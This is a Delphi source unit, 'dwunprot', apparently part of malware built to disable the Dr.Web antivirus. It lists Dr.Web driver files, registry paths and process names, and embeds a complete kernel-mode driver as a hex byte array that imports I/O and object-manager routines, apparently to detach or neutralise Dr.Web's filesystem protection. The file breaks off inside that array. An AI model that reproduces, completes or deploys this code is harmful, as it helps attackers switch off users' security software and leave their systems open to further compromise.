{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$O-}
{$IFDEF minimum}
program dwunprot;
{$ENDIF}
unit dwunprot;
interface

uses
  Windows, WinNative, RTL, LDasm, Loader;


implementation

const
  DrWebProcessesMax = 8;
  spidiedriver: PWideChar = '\system32\drivers\spidie.sys';

  drivers: array[0..3] of PWideChar = ('dwprot.sys', 'drwebaf.sys', 'DrWebPF.sys', 'spiderg3.sys');

  RegPath: PWideChar = '\Registry\Machine\System\CurrentControlSet\Services\spidie';
  String5: PWideChar = '\BaseNamedObjects\dwunprotwait';
  String6: PWideChar = 'dwunprot.dll';
  String7: PWideChar = 'Run Forest run!';
  DrWebProcesses: array[0..DrWebProcessesMax] of PWideChar = (
    'dwengine.exe', 'drweb32w.exe', 'spiderml.exe', 'spidernt.exe', 'spiderui.exe',
    'spidergate.exe', 'spideragent.exe', 'drwebupw.exe', 'frwl_notify.exe');

  data: array[0..4607] of byte = (
    $4D, $5A, $90, $00, $03, $00, $00, $00, $04, $00, $00, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $E0, $00, $00, $00,
    $0E, $1F, $BA, $0E, $00, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $54, $68,
    $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $63, $61, $6E, $6E, $6F,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $69, $6E, $20, $44, $4F, $53, $20,
    $6D, $6F, $64, $65, $2E, $0D, $0D, $0A, $24, $00, $00, $00, $00, $00, $00, $00,
    $5F, $3D, $C4, $F3, $1B, $5C, $AA, $A0, $1B, $5C, $AA, $A0, $1B, $5C, $AA, $A0,
    $12, $24, $2E, $A0, $1A, $5C, $AA, $A0, $D8, $53, $A5, $A0, $1A, $5C, $AA, $A0,
    $D8, $53, $F5, $A0, $19, $5C, $AA, $A0, $12, $24, $39, $A0, $1E, $5C, $AA, $A0,
    $1B, $5C, $AB, $A0, $00, $5C, $AA, $A0, $12, $24, $23, $A0, $19, $5C, $AA, $A0,
    $12, $24, $3B, $A0, $1A, $5C, $AA, $A0, $52, $69, $63, $68, $1B, $5C, $AA, $A0,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $50, $45, $00, $00, $4C, $01, $05, $00, $B2, $B9, $A9, $4B, $00, $00, $00, $00,
    $00, $00, $00, $00, $E0, $00, $02, $01, $0B, $01, $09, $00, $00, $06, $00, $00,
    $00, $0A, $00, $00, $00, $00, $00, $00, $4A, $12, $00, $00, $00, $10, $00, $00,
    $00, $20, $00, $00, $00, $00, $40, $00, $00, $10, $00, $00, $00, $02, $00, $00,
    $05, $00, $00, $00, $05, $00, $00, $00, $05, $00, $00, $00, $00, $00, $00, $00,
    $00, $60, $00, $00, $00, $04, $00, $00, $99, $19, $00, $00, $01, $00, $00, $00,
    $00, $00, $10, $00, $00, $10, $00, $00, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $40, $00, $00, $3C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $50, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $B8, $20, $00, $00, $40, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $44, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $2E, $74, $65, $78, $74, $00, $00, $00,
    $91, $03, $00, $00, $00, $10, $00, $00, $00, $04, $00, $00, $00, $04, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $68,
    $2E, $72, $64, $61, $74, $61, $00, $00, $14, $01, $00, $00, $00, $20, $00, $00,
    $00, $02, $00, $00, $00, $08, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $48, $2E, $64, $61, $74, $61, $00, $00, $00,
    $20, $04, $00, $00, $00, $30, $00, $00, $00, $04, $00, $00, $00, $0A, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $C8,
    $49, $4E, $49, $54, $00, $00, $00, $00, $B2, $01, $00, $00, $00, $40, $00, $00,
    $00, $02, $00, $00, $00, $0E, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $20, $00, $00, $E2, $2E, $72, $65, $6C, $6F, $63, $00, $00,
    $DC, $00, $00, $00, $00, $50, $00, $00, $00, $02, $00, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $42,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $8B, $FF, $55, $8B, $EC, $83, $EC, $0C, $83, $65, $FC, $00, $68, $18, $32, $40,
    $00, $8D, $45, $F4, $50, $FF, $15, $2C, $20, $40, $00, $8D, $45, $FC, $50, $A1,
    $0C, $20, $40, $00, $6A, $00, $6A, $00, $FF, $30, $8D, $45, $F4, $6A, $40, $6A,
    $00, $6A, $40, $50, $FF, $15, $20, $20, $40, $00, $85, $C0, $7C, $09, $8B, $4D,
    $FC, $FF, $15, $30, $20, $40, $00, $8B, $45, $FC, $C9, $C3, $8B, $FF, $55, $8B,
    $EC, $56, $8B, $71, $04, $33, $C0, $EB, $18, $8B, $4E, $08, $3B, $4D, $08, $75,
    $0B, $85, $C0, $74, $07, $50, $FF, $15, $1C, $20, $40, $00, $8B, $C6, $8B, $76,
    $10, $85, $F6, $75, $E4, $5E, $5D, $C2, $04, $00, $68, $98, $00, $00, $00, $68,
    $08, $21, $40, $00, $E8, $43, $02, $00, $00, $83, $65, $FC, $00, $68, $50, $13,
    $40, $00, $8D, $45, $D8, $50, $FF, $15, $2C, $20, $40, $00, $6A, $7F, $6A, $00,
    $8D, $85, $58, $FF, $FF, $FF, $50, $E8, $18, $02, $00, $00, $83, $C4, $0C, $83,
    $4D, $E4, $FF, $8D, $45, $E0, $50, $6A, $7F, $8D, $85, $58, $FF, $FF, $FF, $50,
    $6A, $02, $8D, $45, $D8, $50, $FF, $75, $08, $FF, $15, $10, $20, $40, $00, $85,
    $C0, $7C, $16, $8B, $85, $64, $FF, $FF, $FF, $89, $45, $E4, $EB, $0B, $33, $C0,
    $40, $C3, $8B, $65, $E8, $83, $4D, $E4, $FF, $83, $4D, $FC, $FF, $8B, $45, $E4,
    $E8, $12, $02, $00, $00, $C2, $04, $00, $8B, $FF, $55, $8B, $EC, $83, $EC, $30,
    $53, $56, $57, $33, $DB, $68, $08, $02, $00, $00, $53, $BE, $18, $32, $40, $00,
    $56, $89, $5D, $F8, $E8, $AB, $01, $00, $00, $BF, $20, $13, $40, $00, $83, $C4,
    $0C, $8B, $D7, $8B, $CE, $E8, $42, $01, $00, $00, $BA, $40, $13, $40, $00, $8B,
    $CE, $E8, $72, $01, $00, $00, $E8, $C5, $FE, $FF, $FF, $89, $45, $F4, $3B, $C3,
    $0F, $84, $FD, $00, $00, $00, $8B, $45, $08, $8B, $50, $04, $8B, $CE, $E8, $19,
    $01, $00, $00, $56, $8D, $45, $E8, $50, $FF, $15, $2C, $20, $40, $00, $8D, $45,
    $E8, $89, $45, $D8, $8D, $45, $D0, $50, $68, $3F, $00, $0F, $00, $8D, $45, $FC,
    $50, $C7, $45, $D0, $18, $00, $00, $00, $89, $5D, $D4, $C7, $45, $DC, $40, $00,
    $00, $00, $89, $5D, $E0, $89, $5D, $E4, $FF, $15, $28, $20, $40, $00, $85, $C0,
    $7C, $61, $FF, $75, $FC, $E8, $E0, $FE, $FF, $FF, $8B, $0D, $34, $20, $40, $00,
    $89, $45, $08, $3B, $01, $76, $43, $83, $F8, $FF, $74, $3E, $53, $8D, $45, $F8,
    $50, $53, $53, $53, $FF, $75, $FC, $FF, $15, $18, $20, $40, $00, $85, $C0, $7C,
    $29, $8B, $4D, $F8, $8B, $59, $F0, $FF, $15, $30, $20, $40, $00, $FF, $15, $00,
    $20, $40, $00, $88, $45, $F0, $8B, $45, $08, $FF, $75, $F0, $89, $83, $9C, $00,
    $00, $00, $FF, $15, $04, $20, $40, $00, $33, $DB, $FF, $75, $FC, $FF, $15, $14,
    $20, $40, $00, $8B, $D7, $8B, $CE, $E8, $70, $00, $00, $00, $BA, $60, $13, $40,
    $00, $8B, $CE, $E8, $A0, $00, $00, $00, $E8, $F3, $FD, $FF, $FF, $3B, $C3, $74,
    $0A, $FF, $75, $F4, $8B, $C8, $E8, $31, $FE, $FF, $FF, $8B, $D7, $8B, $CE, $E8,
    $48, $00, $00, $00, $BA, $70, $13, $40, $00, $8B, $CE, $E8, $78, $00, $00, $00,
    $E8, $CB, $FD, $FF, $FF, $3B, $C3, $74, $0A, $FF, $75, $F4, $8B, $C8, $E8, $09,
    $FE, $FF, $FF, $5F, $5E, $5B, $C9, $C2, $04, $00, $8B, $FF, $55, $8B, $EC, $68,
    $80, $13, $40, $00, $FF, $15, $24, $20, $40, $00, $59, $FF, $75, $0C, $E8, $95,
    $FE, $FF, $FF, $B8, $89, $01, $00, $C0, $5D, $C2, $08, $00, $57, $56, $8B, $F1,
    $8B, $FA, $83, $C9, $FF, $33, $C0, $F2, $66, $AF, $F7, $D1, $03, $C9, $8B, $FE,
    $8B, $F2, $8B, $C7, $8B, $D1, $C1, $E9, $02, $F2, $A5, $8B, $CA, $83, $E1, $03,
    $F2, $A4, $5E, $5F, $C3, $CC, $8B, $D7, $8B, $F9, $83, $C9, $FF, $33, $C0, $F2,
    $66, $AF, $8D, $47, $FE, $8B, $FA, $C3, $8B, $FF, $56, $57, $8B, $FA, $8B, $F1,
    $E8, $E1, $FF, $FF, $FF, $8B, $D7, $8B, $C8, $E8, $AE, $FF, $FF, $FF, $5F, $8B,
    $C6, $5E, $C3, $CC, $FF, $25, $38, $20, $40, $00, $CC, $CC, $68, $18, $13, $40,
    $00, $64, $A1, $00, $00, $00, $00, $50, $8B, $44, $24, $10, $89, $6C, $24, $10,
    $8D, $6C, $24, $10, $2B, $E0, $53, $56, $57, $8B, $45, $F8, $89, $65, $E8, $50,
    $8B, $45, $FC, $C7, $45, $FC, $FF, $FF, $FF, $FF, $89, $45, $F8, $8D, $45, $F0,
    $64, $A3, $00, $00, $00, $00, $C3, $8B, $4D, $F0, $64, $89, $0D, $00, $00, $00,
    $00, $59, $5F, $5E, $5B, $C9, $51, $C3, $FF, $25, $3C, $20, $40, $00, $CC, $CC,
    $5C, $00, $46, $00, $69, $00, $6C, $00, $65, $00, $53, $00, $79, $00, $73, $00,
    $74, $00, $65, $00, $6D, $00, $5C, $00, $00, $00, $CC, $CC, $CC, $CC, $CC, $CC,
    $64, $00, $77, $00, $70, $00, $72, $00, $6F, $00, $74, $00, $00, $00, $CC, $CC,
    $50, $00, $61, $00, $72, $00, $73, $00, $65, $00, $00, $00, $CC, $CC, $CC, $CC,
    $6E, $00, $74, $00, $66, $00, $73, $00, $00, $00, $CC, $CC, $CC, $CC, $CC, $CC,
    $66, $00, $61, $00, $73, $00, $74, $00, $66, $00, $61, $00, $74, $00, $00, $00,
    $47, $6C, $6F, $72, $79, $20, $74, $6F, $20, $72, $6F, $62, $6F, $74, $73, $21,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $66, $41, $00, $00, $7E, $41, $00, $00, $00, $00, $00, $00, $C0, $40, $00, $00,
    $D6, $40, $00, $00, $E8, $40, $00, $00, $F2, $40, $00, $00, $AE, $40, $00, $00,
    $26, $41, $00, $00, $40, $41, $00, $00, $4C, $41, $00, $00, $96, $40, $00, $00,
    $0E, $41, $00, $00, $80, $40, $00, $00, $94, $41, $00, $00, $9E, $41, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $30, $31, $32, $33, $34, $35, $36, $37,
    $38, $39, $41, $42, $43, $44, $45, $46, $00, $00, $00, $00, $30, $00, $31, $00,
    $32, $00, $33, $00, $34, $00, $35, $00, $36, $00, $37, $00, $38, $00, $39, $00,
    $41, $00, $42, $00, $43, $00, $44, $00, $45, $00, $46, $00, $00, $00, $00, $00,
    $71, $03, $00, $00, $20, $0F, $00, $00, $1F, $00, $00, $00, $1C, $00, $00, $00,
    $1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00,
    $1F, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00,
    $1E, $00, $00, $00, $1F, $00, $00, $00, $48, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $32, $40, $00, $00, $21, $40, $00, $01, $00, $00, $00,
    $18, $13, $00, $00, $00, $00, $00, $00, $FF, $FF, $FF, $FF, $DE, $10, $40, $00,
    $E2, $10, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $01, $01, $00, $00, $00, $00, $10, $11, $02, $03, $00, $00, $00, $00,
    $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02,
    $03, $11, $03, $03, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $14, $00, $00, $00, $00, $00,
    $10, $10, $10, $10, $00, $00, $00, $00, $02, $10, $00, $00, $00, $00, $00, $00,
    $02, $02, $02, $02, $02, $02, $02, $02, $10, $10, $10, $10, $10, $10, $10, $10,
    $03, $03, $04, $00, $01, $01, $03, $11, $06, $00, $04, $00, $00, $02, $00, $00,
    $01, $01, $01, $01, $02, $02, $00, $00, $20, $20, $20, $20, $20, $20, $20, $20,
    $02, $02, $02, $02, $02, $02, $02, $02, $50, $50, $14, $02, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $01, $01, $00, $00, $00, $00, $00, $00, $01, $41,
    $01, $01, $01, $01, $00, $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $03,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $01, $00, $01, $00, $01, $01, $01, $01, $01, $01, $01, $01,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $03, $03, $03, $03, $01, $01, $01, $00, $00, $00, $00, $00, $01, $01, $01, $01,
    $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $00, $00, $00, $01, $03, $01, $00, $00, $00, $00, $00, $01, $03, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $00, $00, $03, $01, $01, $01, $01, $01,
    $01, $01, $03, $01, $03, $03, $03, $01, $00, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $00,
    $40, $BB, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $48, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $58, $41, $00, $00,
    $0C, $20, $00, $00, $3C, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $8C, $41, $00, $00, $00, $20, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $66, $41, $00, $00,
    $7E, $41, $00, $00, $00, $00, $00, $00, $C0, $40, $00, $00, $D6, $40, $00, $00,
    $E8, $40, $00, $00, $F2, $40, $00, $00, $AE, $40, $00, $00, $26, $41, $00, $00,
    $40, $41, $00, $00, $4C, $41, $00, $00, $96, $40, $00, $00, $0E, $41, $00, $00,
    $80, $40, $00, $00, $94, $41, $00, $00, $9E, $41, $00, $00, $00, $00, $00, $00,
    $B3, $00, $4D, $6D, $53, $79, $73, $74, $65, $6D, $52, $61, $6E, $67, $65, $53,
    $74, $61, $72, $74, $00, $00, $0A, $01, $52, $74, $6C, $49, $6E, $69, $74, $55,
    $6E, $69, $63, $6F, $64, $65, $53, $74, $72, $69, $6E, $67, $00, $00, $57, $00,
    $49, $6F, $44, $65, $74, $61, $63, $68, $44, $65, $76, $69, $63, $65, $00, $00,
    $5A, $00, $49, $6F, $44, $72, $69, $76, $65, $72, $4F, $62, $6A, $65, $63, $74,
    $54, $79, $70, $65, $00, $00, $C6, $01, $5A, $77, $51, $75, $65, $72, $79, $56,
    $61, $6C, $75, $65, $4B, $65, $79, $00, $37, $01, $5A, $77, $43, $6C, $6F, $73,
    $65, $00, $CB, $00, $4F, $62, $52, $65, $66, $65, $72, $65, $6E, $63, $65, $4F,
    $62, $6A, $65, $63, $74, $42, $79, $48, $61, $6E, $64, $6C, $65, $00, $CE, $00,
    $4F, $62, $66, $44, $65, $72, $65, $66, $65, $72, $65, $6E, $63, $65, $4F, $62,
    $6A, $65, $63, $74, $00, $00, $CC, $00, $4F, $62, $52, $65, $66, $65, $72, $65,
    $6E, $63, $65, $4F, $62, $6A, $65, $63, $74, $42, $79, $4E, $61, $6D, $65, $00,
    $27, $00, $44, $62, $67, $50, $72, $69, $6E, $74, $00, $00, $90, $01, $5A, $77,
    $4F, $70, $65, $6E, $4B, $65, $79, $00, $6E, $74, $6F, $73, $6B, $72, $6E, $6C,
    $2E, $65, $78, $65, $00, $00, $09, $00, $4B, $65, $52, $61, $69, $73, $65, $49,
    $72, $71, $6C, $54, $6F, $44, $70, $63, $4C, $65, $76, $65, $6C, $00, $07, $00,
    $4B, $65, $4C, $6F, $77, $65, $72, $49, $72, $71, $6C, $00, $68, $61, $6C, $2E,
    $64, $6C, $6C, $00, $07, $06, $6D, $65, $6D, $73, $65, $74, $00, $00, $E3, $05,
    $5F, $65, $78, $63, $65, $70, $74, $5F, $68, $61, $6E, $64, $6C, $65, $72, $33,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $10, $00, $00, $40, $00, $00, $00, $0D, $30, $17, $30, $20, $30, $36, $30,
    $43, $30, $68, $30, $80, $30, $8E, $30, $98, $30, $CB, $30, $0C, $31, $1A, $31,
    $2B, $31, $5A, $31, $8A, $31, $9C, $31, $B9, $31, $C9, $31, $CF, $31, $E4, $31,
    $EF, $31, $FD, $31, $25, $32, $50, $32, $56, $32, $C6, $32, $CD, $32, $1A, $33,
    $00, $20, $00, $00, $10, $00, $00, $00, $F4, $30, $F8, $30, $0C, $31, $10, $31,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
